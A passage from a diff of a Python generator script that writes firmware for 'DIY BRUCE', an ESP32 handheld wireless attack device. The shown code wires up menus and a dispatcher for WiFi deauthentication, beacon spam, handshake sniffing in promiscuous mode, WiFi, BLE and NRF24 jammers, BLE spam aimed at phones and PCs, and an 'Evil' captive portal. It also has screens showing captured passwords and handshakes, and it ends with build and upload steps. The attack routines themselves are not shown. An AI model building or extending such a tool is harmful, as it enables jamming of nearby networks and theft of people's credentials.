+void setBrightness() {
+    uint8_t contrast = 200;
+    while (true) {
+        u8g2.clearBuffer();
+        drawTopBar();
+        u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(40, 10, "BRIGHTNESS");
+        u8g2.drawFrame(8, 32, 112, 12);
+        u8g2.drawBox(8, 32, contrast * 112 / 255, 12);
+        char buf[8];
+        sprintf(buf, "%d%%", contrast * 100 / 255);
+        int w = u8g2.getStrWidth(buf);
+        u8g2.drawStr((128 - w) / 2, 52, buf);
+        u8g2.drawStr(8, 30, "<");
+        u8g2.drawStr(110, 30, ">");
+        u8g2.drawStr(2, 62, "LR=change OK=save BACK=exit");
+        u8g2.sendBuffer();
+        
+        if (checkButton(BTN_LEFT) && contrast > 10) contrast -= 10;
+        else if (checkButton(BTN_RIGHT) && contrast < 255) contrast += 10;
+        else if (checkButton(BTN_OK)) { u8g2.setContrast(contrast); showSuccess("SAVED!", ""); break; }
+        else if (checkButton(BTN_BACK)) break;
+        delay(50);
+    }
+}
+
+// ============================================================================
+// МЕНЮ
+// ============================================================================
+const char* modules[] = {"WiFi", "BLE", "NRF24", "IR", "GPIO", "Games", "Config"};
+
+const char* wifiSub[] = {"SCAN", "DEAUTH", "BEACON", "HANDSHAKE", "WIFI JAM", "EVIL", "WEB", "CONNECT", "DEAUTH MAC", "STOP", "INFO", "REBOOT"};
+const int wifiSize = 12;
+const char* bleSub[] = {"SCAN", "APPLE", "SAMSUNG", "ANDROID", "WINDOWS", "ALL", "BLE JAM", "INFO", "STOP", "REBOOT"};
+const int bleSize = 10;
+const char* nrfSub[] = {"SCAN", "NRF JAM", "INFO", "STOP", "REBOOT"};
+const int nrfSize = 5;
+const char* irSub[] = {"POWER", "VOL+", "VOL-", "CH+", "CH-", "MUTE", "BRAVIS", "SAMSUNG", "STOP", "REBOOT"};
+const int irSize = 10;
+const char* gpioSub[] = {"INFO", "REBOOT"};
+const int gpioSize = 2;
+const char* gamesSub[] = {"INFO", "REBOOT"};
+const int gamesSize = 2;
+const char* configSub[] = {"BRIGHT", "WEB ON", "WEB OFF", "SHOW PASS", "SHOW HAND", "FORMAT", "ABOUT", "REBOOT"};
+const int configSize = 8;
+
+bool inSubMenuFlag = false;
+int currentSubIndex = 0, subScroll = 0;
+const int SUB_VISIBLE = 4;
+
+void drawMainMenu() {
+    u8g2.clearBuffer();
+    drawTopBar();
+    int prev = (currentModule - 1 + 7) % 7;
+    int next = (currentModule + 1) % 7;
+    
+    u8g2.drawRFrame(44, 12, 40, 40, 4);
+    u8g2.setFont(u8g2_font_7x13B_tr);
+    int nw = u8g2.getStrWidth(modules[currentModule]);
+    u8g2.drawStr((128 - nw) / 2, 58, modules[currentModule]);
+    u8g2.drawStr(28, 36, "<");
+    u8g2.drawStr(93, 36, ">");
+    u8g2.sendBuffer();
+}
+
+void drawSubMenu() {
+    int size;
+    const char** items;
+    const char* title;
+    
+    switch (currentModule) {
+        case 0: title = "WiFi"; items = wifiSub; size = wifiSize; break;
+        case 1: title = "BLE"; items = bleSub; size = bleSize; break;
+        case 2: title = "NRF24"; items = nrfSub; size = nrfSize; break;
+        case 3: title = "IR"; items = irSub; size = irSize; break;
+        case 4: title = "GPIO"; items = gpioSub; size = gpioSize; break;
+        case 5: title = "Games"; items = gamesSub; size = gamesSize; break;
+        default: title = "Config"; items = configSub; size = configSize; break;
+    }
+    
+    if (currentSubIndex < subScroll) subScroll = currentSubIndex;
+    if (currentSubIndex >= subScroll + SUB_VISIBLE) subScroll = currentSubIndex - SUB_VISIBLE + 1;
+    
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.drawBox(0, 11, 128, 12);
+    u8g2.setDrawColor(0);
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(2, 21, title);
+    u8g2.setDrawColor(1);
+    u8g2.drawLine(0, 23, 128, 23);
+    
+    for (int i = 0; i < SUB_VISIBLE && (subScroll + i) < size; i++) {
+        int idx = subScroll + i;
+        int y = 26 + i * 10;
+        if (idx == currentSubIndex) {
+            u8g2.drawBox(0, y-8, 128, 10);
+            u8g2.setDrawColor(0);
+            u8g2.setCursor(30, y);
+            u8g2.print(items[idx]);
+            u8g2.setDrawColor(1);
+        } else {
+            u8g2.setCursor(30, y);
+            u8g2.print(items[idx]);
+        }
+    }
+    
+    if (size > SUB_VISIBLE) {
+        int bh = max(5, (39 * SUB_VISIBLE) / size);
+        int by = 23 + (subScroll * (39 - bh)) / max(1, size - SUB_VISIBLE);
+        u8g2.drawBox(124, by, 3, bh);
+    }
+    u8g2.sendBuffer();
+}
+
+void executeAction() {
+    switch (currentModule) {
+        case 0: // WiFi
+            switch (currentSubIndex) {
+                case 0: scanWiFi(); break;
+                case 1: startDeauth(); break;
+                case 2: startBeacon(); break;
+                case 3: startHandshake(); break;
+                case 4: startWiFiJammer(); break;
+                case 5: startEvil(); break;
+                case 6: startWebServer(); break;
+                case 7: selectWiFiNetwork(); break;
+                case 8: deauthByMAC(); break;
+                case 9: stopWiFiJammer(); stopDeauth(); stopBeacon(); showMessage("ALL STOPPED", 1000); break;
+                case 10: showMessage("WiFi INFO", 1000); break;
+                case 11: reboot(); break;
+            } break;
+        case 1: // BLE
+            switch (currentSubIndex) {
+                case 0: bleScan(); break;
+                case 1: bleApple(); break;
+                case 2: bleSamsung(); break;
+                case 3: bleAndroid(); break;
+                case 4: bleWindows(); break;
+                case 5: bleAll(); break;
+                case 6: startBLEJammer(); break;
+                case 7: bleInfo(); break;
+                case 8: stopBLEJammer(); break;
+                case 9: reboot(); break;
+            } break;
+        case 2: // NRF
+            switch (currentSubIndex) {
+                case 0: nrfScan(); break;
+                case 1: startNRFJammer(); break;
+                case 2: nrfInfo(); break;
+                case 3: stopNRFJammer(); break;
+                case 4: reboot(); break;
+            } break;
+        case 3: // IR
+            switch (currentSubIndex) {
+                case 0: irPower(); break;
+                case 1: irVolUp(); break;
+                case 2: irVolDown(); break;
+                case 3: irChUp(); break;
+                case 4: irChDown(); break;
+                case 5: irMute(); break;
+                case 6: irBravis(); break;
+                case 7: irSamsung(); break;
+                case 8: showMessage("IR STOP", 500); break;
+                case 9: reboot(); break;
+            } break;
+        case 4: // GPIO
+            switch (currentSubIndex) {
+                case 0: showMessage("GPIO INFO", 1000); break;
+                case 1: reboot(); break;
+            } break;
+        case 5: // Games
+            switch (currentSubIndex) {
+                case 0: showMessage("GAMES INFO", 1000); break;
+                case 1: reboot(); break;
+            } break;
+        case 6: // Config
+            switch (currentSubIndex) {
+                case 0: setBrightness(); break;
+                case 1: startWebServer(); break;
+                case 2: stopWebServer(); break;
+                case 3: showSuccess("PASSWORDS", capturedPasswords.length() ? capturedPasswords.substring(0, 50).c_str() : "None"); break;
+                case 4: showSuccess("HANDSHAKES", handshakes.length() ? handshakes.substring(0, 50).c_str() : "None"); break;
+                case 5: capturedPasswords = ""; handshakes = ""; saveData(); showMessage("DATA CLEARED", 1000); break;
+                case 6: showSuccess("DIY BRUCE v25.0", "WiFi | BLE | NRF | IR | JAMMER"); break;
+                case 7: reboot(); break;
+            } break;
+    }
+}
+
+// ============================================================================
+// SETUP & LOOP
+// ============================================================================
+void setup() {
+    Serial.begin(115200);
+    
+    // Піни кнопок
+    pinMode(BTN_UP, INPUT_PULLUP);
+    pinMode(BTN_DOWN, INPUT_PULLUP);
+    pinMode(BTN_OK, INPUT_PULLUP);
+    pinMode(BTN_LEFT, INPUT_PULLUP);
+    pinMode(BTN_RIGHT, INPUT_PULLUP);
+    pinMode(BTN_BACK, INPUT_PULLUP);
+    
+    // I2C дисплей
+    Wire.begin(I2C_SDA, I2C_SCL);
+    u8g2.begin();
+    u8g2.setContrast(200);
+    
+    // Завантаження даних
+    loadData();
+    uptimeStart = millis();
+    
+    // Анімація логотипу Hydra
+    for (int a = 255; a >= 0; a -= 15) {
+        u8g2.clearBuffer();
+        u8g2.drawXBM(32, 0, 64, 64, hydra_logo);
+        u8g2.setContrast(a);
+        u8g2.sendBuffer();
+        delay(20);
+    }
+    u8g2.setContrast(200);
+    delay(500);
+    
+    // Ініціалізація
+    WiFi.mode(WIFI_AP_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(handshakeSniffer);
+    
+    // NRF24
+    SPI.begin(18, 19, 23, NRF_CSN);
+    radio.begin();
+    
+    drawMainMenu();
+    showMessage("READY", 1000);
+}
+
+void loop() {
+    if (webRunning) server.handleClient();
+    if (evilActive) { dnsServer.processNextRequest(); server.handleClient(); }
+    
+    lastRSSI = WiFi.RSSI();
+    
+    if (!inSubMenuFlag) {
+        if (checkButton(BTN_LEFT)) {
+            currentModule = (currentModule - 1 + 7) % 7;
+            drawMainMenu();
+        } else if (checkButton(BTN_RIGHT)) {
+            currentModule = (currentModule + 1) % 7;
+            drawMainMenu();
+        } else if (checkButton(BTN_OK) || checkButton(BTN_DOWN)) {
+            inSubMenuFlag = true;
+            currentSubIndex = 0;
+            subScroll = 0;
+            drawSubMenu();
+        }
+    } else {
+        int size;
+        switch (currentModule) {
+            case 0: size = wifiSize; break;
+            case 1: size = bleSize; break;
+            case 2: size = nrfSize; break;
+            case 3: size = irSize; break;
+            case 4: size = gpioSize; break;
+            case 5: size = gamesSize; break;
+            default: size = configSize; break;
+        }
+        
+        if (checkButton(BTN_UP)) {
+            currentSubIndex = (currentSubIndex - 1 + size) % size;
+            drawSubMenu();
+        } else if (checkButton(BTN_DOWN)) {
+            currentSubIndex = (currentSubIndex + 1) % size;
+            drawSubMenu();
+        } else if (checkButton(BTN_OK)) {
+            executeAction();
+            drawSubMenu();
+        } else if (checkButton(BTN_BACK)) {
+            inSubMenuFlag = false;
+            drawMainMenu();
+        }
+    }
+    delay(20);
+}
+'''
+    
+    with open(os.path.join(base, "src", "main.cpp"), "w", encoding="utf-8") as f:
+        f.write(main_cpp)
+    
+    print("=" * 70)
+    print(f"✅ ПРОЄКТ СТВОРЕНО: {os.path.abspath(base)}")
+    print("=" * 70)
+    print("📁 Структура:")
+    print("   DIY_BRUCE_COMPLETE/")
+    print("   ├── platformio.ini")
+    print("   ├── src/")
+    print("   │   └── main.cpp")
+    print("   ├── include/")
+    print("   │   ├── CONFIG.h")
+    print("   │   ├── hydra_logo.h")
+    print("   │   ├── icons.h")
+    print("   │   └── interface.h")
+    print("   └── data/")
+    print("       ├── index.html  (12 вкладок)")
+    print("       ├── portal.html (Evil Portal)")
+    print("       └── tv.html     (TV Remote)")
+    print("=" * 70)
+    print("🚀 Як використовувати:")
+    print("   1. Відкрийте папку в VS Code")
+    print("   2. PlatformIO → Build")
+    print("   3. PlatformIO → Upload")
+    print("   4. Підключіться до WiFi 'DIY_BRUCE' (пароль: bruce1234)")
+    print("   5. Відкрийте браузер → 192.168.4.1")
+    print("=" * 70)
+
+if __name__ == "__main__":
+    create_project()
